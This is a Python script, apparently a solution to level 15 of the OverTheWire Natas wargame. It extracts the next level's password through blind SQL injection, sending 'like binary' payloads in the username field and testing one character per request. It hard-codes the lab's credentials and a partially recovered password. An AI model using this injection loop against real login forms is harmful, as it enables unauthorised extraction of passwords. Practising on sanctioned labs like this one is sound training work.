import requests

http_proxy  = "http://127.0.0.1:8080"
https_proxy = "http://127.0.0.1:8080"
ftp_proxy   = "http://127.0.0.1:8080"
#natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
str='''ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'''
ASCII = ''.join(chr(x) for x in range(128))
#print (ASCII);
payload1='''natas16" and password like binary "'''
payload2='''%'''
payload=payload1+payload2
ans=''''''
proxyDict = {
              "http"  : http_proxy,
              "https" : https_proxy,
              "ftp"   : ftp_proxy
            }
datatosend =    {"username":payload
                }
headerstosend = {"Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="
           }
URL="http://natas15.natas.labs.overthewire.org/index.php"
r=requests.post(url = URL, headers=headerstosend, data=datatosend, proxies=proxyDict)
#print (r.content)
#for i in range(1,32):
ans="WaIHEacj63wnNIBROHeqi3p9t0m5nhm"
for elem in str:
       datatosend = {"username": payload1+ans+elem+payload2
                      }
       r=requests.post(url = URL, headers=headerstosend, data=datatosend, proxies=proxyDict)
       if r.content.decode("utf-8").__contains__("This user exists."):
           ans=ans+elem
           print(ans)
           break
print (ans)

